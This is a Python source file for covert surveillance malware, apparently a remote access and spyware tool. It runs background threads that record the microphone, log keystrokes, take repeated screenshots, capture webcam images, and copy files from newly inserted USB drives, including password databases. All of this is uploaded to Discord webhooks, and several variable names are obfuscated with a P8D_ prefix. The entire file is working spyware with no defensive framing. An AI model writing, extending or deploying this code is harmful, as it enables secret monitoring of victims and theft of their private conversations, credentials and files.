import requests
import keyboard
import socket
import time
import mss
from PIL import Image
from io import BytesIO
from datetime import datetime
import threading
import cv2
import shutil
import os
import psutil
import wave
import pyaudio

P8D_WU = ""
P8D_SWU = ""
P8D_NWU = ""  
DISCORD_WEBHOOK = ""
WEBHOOK_URL = ''
default_webhook_url = ""

def get_default_microphone():
    audio = pyaudio.PyAudio()
    default_index = audio.get_default_input_device_info()["index"]
    device_name = audio.get_default_input_device_info()["name"]
    audio.terminate()
    return default_index, device_name

def record_audio(filename, device_index, duration=60, rate=44100, chunk=1024):
    audio = pyaudio.PyAudio()

    try:
        stream = audio.open(
            format=pyaudio.paInt16,
            channels=1,
            rate=rate,
            input=True,
            input_device_index=device_index,
            frames_per_buffer=chunk
        )
    except OSError as e:
        print(f"Error opening audio stream: {e}")
        audio.terminate()
        return False

    frames = []
    print(f"Starting recording for {duration} seconds...")

    for _ in range(0, int(rate / chunk * duration)):
        data = stream.read(chunk)
        frames.append(data)

    print("Recording completed.")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

    return True

def send_audio_to_discord(filename, device_name, webhook_url):
    if not os.path.exists(filename):
        print(f"Error: File {filename} not found.")
        return

    device_host = socket.gethostname()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open(filename, 'rb') as audio_file:
        files = {'file': (os.path.basename(filename), audio_file, 'audio/mpeg')}
        payload = {
            'content': f"Audio recorded from **{device_name}** on **{device_host}** at {timestamp}."
        }

        try:
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                print(f"Audio file successfully sent: {filename}")
            else:
                print(f"Error sending to Discord (status {response.status_code})")
        except Exception as e:
            print(f"Error sending audio file: {e}")

def start_audio_capture():
    device_index, device_name = get_default_microphone()
    filename = "recorded_audio.wav"
    print(f"Using device: {device_name}")

    while True:
        if record_audio(filename, device_index):
            send_audio_to_discord(filename, device_name, default_webhook_url)
            os.remove(filename)
        time.sleep(3)

audio_thread = threading.Thread(target=start_audio_capture)
audio_thread.daemon = True
audio_thread.start()

def Pgdi():
    P8D_klm = socket.gethostname()
    return P8D_klm

def P8Dsk(P8D_k, P8D_DI11):
    P8D_ms12 = ' '.join(P8D_k)
    P8D_ms33 = f"fDI11: {P8D_DI11}\n```{P8D_ms12}```" 

    P8D_a1b = {
        "content": P8D_ms33
    }

    try:
        P8D_r = requests.post(P8D_WU, json=P8D_a1b)
        if P8D_r.status_code != 204:
            print(f"Error sending keystrokes (status {P8D_r.status_code})")
    except Exception as P8D_err:
        print(f"Error sending keystrokes: {P8D_err}")

def P8Dss(P8D_scr):
    P8D_klm = socket.gethostname()  
    P8D_jkl = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    P8D_img = Image.frombytes('RGB', (P8D_scr.width, P8D_scr.height), P8D_scr.rgb)

    P8D_img_data = BytesIO()
    P8D_img.save(P8D_img_data, format="PNG")
    P8D_img_data.seek(0)

    P8D_gk9 = {
        "file": ("P8D_9792.png", P8D_img_data, "image/png")
    }

    P8D_d87 = f"Screenshot from {P8D_klm}\nTaken at {P8D_jkl}"

    P8D_p2q = {
        "content": P8D_d87
    }

    try:
        P8D_r = requests.post(P8D_SWU, data=P8D_p2q, files=P8D_gk9)
        if P8D_r.status_code != 204:
            print(f"Error sending screenshot (status {P8D_r.status_code})")
    except Exception as P8D_err:
        print(f"Error sending screenshot: {P8D_err}")

def P8Dstart():
    P8D_klm = Pgdi() 
    P8D_jkl = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    P8D_msg = f"Started on {P8D_klm} at {P8D_jkl}"

    P8D_p2q = {
        "content": P8D_msg
    }

    try:
        P8D_r = requests.post(P8D_NWU, json=P8D_p2q)
        if P8D_r.status_code != 204:
            print(f"Error sending start message (status {P8D_r.status_code})")
    except Exception as P8D_err:
        print(f"Error sending start message: {P8D_err}")

P8D_kp = []

P8D_sk = [
    'space', 'shift', 'ctrl', 'alt', 'enter', 'backspace', 'tab', 'capslock', 'esc', 'insert', 'delete', 
    'home', 'end', 'pageup', 'pagedown', 'numlock', 'scrolllock', 'win', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 
    'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'prtsc', 'pause', 'break', 'num 0', 'num 1', 'num 2', 'num 3', 
    'num 4', 'num 5', 'num 6', 'num 7', 'num 8', 'num 9', 'num *', 'num +', 'num -', 'num .', 'num /', 
    'altgr', 'left arrow', 'right arrow', 'up arrow', 'down arrow', 'enter num', 'clear', 'menu', 'scroll', 
    'mute', 'vol+', 'vol-', 'play', 'stop', 'prev', 'next', 'sleep', 'power', 'contextmenu', 'winleft', 
    'winright', 'windows left', 'windows', 'capslock', 'up', 'down', 'left', 'right', 'end', 'pgup', 'pgdn', 
    'home', 'alt gr', 'right ctrl', 'right alt', 'ctrl c', 'ctrl v', 'ctrl x'
]

def P8De(P8D_e):
    global P8D_kp
    if P8D_e.event_type == keyboard.KEY_DOWN:
        P8D_key = P8D_e.name
        P8D_kp.append(P8D_key)
        if len(P8D_kp) >= 30:
            P8D_DI11 = Pgdi()
            P8Dsk(P8D_kp, P8D_DI11)
            P8D_kp = []

def P8Dts():
    with mss.mss() as P8D_sct:

        P8D_scrs = []
        for P8D_m in P8D_sct.monitors[1:]:
            P8D_scr = P8D_sct.grab(P8D_m)
            P8D_scrs.append(P8D_scr)
        return P8D_scrs

def P8Dcs():
    while True:
        P8D_scrs = P8Dts()
        for P8D_scr in P8D_scrs:
            P8Dss(P8D_scr)
        time.sleep(15)

def get_device_name():
    return socket.gethostname()

def send_to_discord_message(message):
    try:
        response = requests.post(DISCORD_WEBHOOK, data={"content": message})
        if response.status_code != 204:
            print(f"Error sending message to webhook (status {response.status_code})")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")

def send_to_discord(image_data, camera_index):
    device_name = get_device_name()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    message_content = {
        "content": f"Camera {camera_index} capture on {device_name} at {timestamp}"
    }

    files = {
        "file": (f"camera_{camera_index}.png", image_data, "image/png")
    }

    try:
        response = requests.post(DISCORD_WEBHOOK, data=message_content, files=files)
        if response.status_code != 204:
            print(f"Error sending to webhook (status {response.status_code})")
    except Exception as e:
        print(f"Error sending to webhook: {e}")

def capture_and_send():
    camera_indices = [0, 1, 2, 4]
    no_camera_detected = True
    
    first_attempt = True  
    
    while True:  
        no_camera_detected = True  
        
        for index in camera_indices:
            try:
                cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                
                time.sleep(4)  
                
                ret, frame = cap.read()  
                
                if ret and frame is not None and frame.size > 0:
                    no_camera_detected = False
                    
                    if frame.shape[0] > 0 and frame.shape[1] > 0:
                        _, buffer = cv2.imencode('.png', frame)
                        image_data = buffer.tobytes()
                        send_to_discord(image_data, index)
                    else:
                        print(f"Invalid frame for camera {index}")
                
                cap.release()
                
                if not no_camera_detected:
                    break 
            
            except Exception as e:
                print(f"Error during camera capture {index}: {e}")
        
        if no_camera_detected:
            send_to_discord_message("No camera detected on the device. Stopping further checks.")
            print(" No camera detected. Permanently stopping the program.")
            break

        if not first_attempt:
            print(" Successful capture. Waiting 4387 seconds before the next attempt...")
            time.sleep(4387)
        
        first_attempt = False

def start_camera_capture():
    capture_thread = threading.Thread(target=capture_and_send)
    capture_thread.daemon = True
    capture_thread.start()

P8Dstart()

P8D_kt = threading.Thread(target=lambda: keyboard.hook(P8De))
P8D_kt.daemon = True
P8D_kt.start()

start_camera_capture()

TEMP_DIR = os.path.join(os.getenv("TEMP"), "usb_copy")

FILE_EXTENSIONS = [
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.txt', '.pdf', '.docx',  
    '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odg',  
    '.html', '.htm', '.xml', '.css', '.js',  
    '.py', '.java', '.cpp', '.h', '.c', '.cs', '.php', '.rb', '.go', '.swift',  
    '.exe', '.msi', '.bat', '.sh', '.bin', '.cmd',  
    '.zip', '.tar', '.gz', '.rar', '.7z', '.tar.gz', '.tar.bz2', '.xz', '.iso', 
    '.mp3', '.wav', '.flac', '.aac', '.ogg',  
    '.mp4', '.mkv', '.avi', '.mov', '.flv', '.wmv', '.webm', '.mpeg',  
    '.apk', '.ipa', '.app',  
    '.json', '.csv', '.tsv',  
    '.sqlite', '.db', '.sql',  
    '.md', '.rst', '.tex', '.org', 
    '.epub', '.mobi', '.azw3', 
    '.psd', '.ai', '.eps', '.svg', '.indd',  
    '.ttf', '.otf',  
    '.dll', '.so', '.dylib',  
    '.torrent',  
    '.vob', '.iso', '.bin', '.cue',  
    '.log', '.bak', '.swp', '.tmp',  
    '.apk', '.jar', '.xapk',  
    '.dmg', '.pkg',  
    '.vhd', '.vmdk',  
    '.ico', '.icns',  
    '.zipx', '.gz', '.bz2',  
    '.svgz', '.webp',  
    '.cbr', '.cbz',  
    '.key', '.numbers', '.pages',  
    '.wps', '.wpt',  
    '.chm', '.hlp',  
    '.kdbx', '.pdb',  
    '.xpi', '.crx',  
    '.deb', '.rpm', '.tar',  
    '.cue', '.ape',  
    '.vtx', '.vtx',  
    '.gpx', '.fit', '.tcx',  
]

def get_usb_name(usb_path):
    partitions = psutil.disk_partitions()
    for partition in partitions:
        if partition.mountpoint == usb_path:
            
            return partition.device.split("\\")[-1]  
    return "Unknown USB"

def send_file_to_discord(file_path, usb_name, computer_name):
    print(f"Attempting to send file {file_path} to Discord...")
    with open(file_path, 'rb') as file:
        files = {'file': file}
        data = {
            'content': f"File __{os.path.basename(file_path)}__ on computer **{computer_name}**."
        }
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        if response.status_code == 204:
            print(f"File successfully sent: {file_path}")
        else:
            print(f"Error sending file {file_path}: {response.status_code}")

def copy_usb_files(usb_path):
    usb_name = get_usb_name(usb_path)  
    computer_name = os.getenv("COMPUTERNAME") or os.uname().nodename  

    print(f"Copying files from {usb_path}...")
    if not os.path.exists(TEMP_DIR):
        os.makedirs(TEMP_DIR)
    
    file_paths = []
    for root, dirs, files in os.walk(usb_path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in FILE_EXTENSIONS):
                source_path = os.path.join(root, file)
                file_size = os.path.getsize(source_path)  
                file_paths.append((source_path, file_size))
    
   
    file_paths.sort(key=lambda x: x[1])  

    
    for source_path, _ in file_paths:
        dest_path = os.path.join(TEMP_DIR, os.path.relpath(source_path, usb_path))
        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
        shutil.copy2(source_path, dest_path)
        print(f"Copied: {source_path} -> {dest_path}")
        send_file_to_discord(dest_path, usb_name, computer_name)


def get_removable_drives():
    drives = []
    partitions = psutil.disk_partitions()
    for partition in partitions:
        print(f"Checking the drive {partition.device} with options {partition.opts}")
        if 'removable' in partition.opts:
            drives.append(partition.mountpoint)
            print(f"Removable drive detected: {partition.mountpoint}")
    return drives

if __name__ == "__main__":  
    screenshot_thread = threading.Thread(target=P8Dcs)
    screenshot_thread.daemon = True  
    screenshot_thread.start()
    
    existing_drives = set(get_removable_drives())
    print(f"Removable drives at startup: {existing_drives}")
    
    try:
        while True:
            current_drives = set(get_removable_drives())
            new_drives = current_drives - existing_drives

            if new_drives:
                usb_path = list(new_drives)[0]
                print(f"New USB drive detected: {usb_path}")
                copy_usb_files(usb_path)
            
            existing_drives = current_drives
            time.sleep(11)

    except KeyboardInterrupt:
        print("Program stopped by user.")

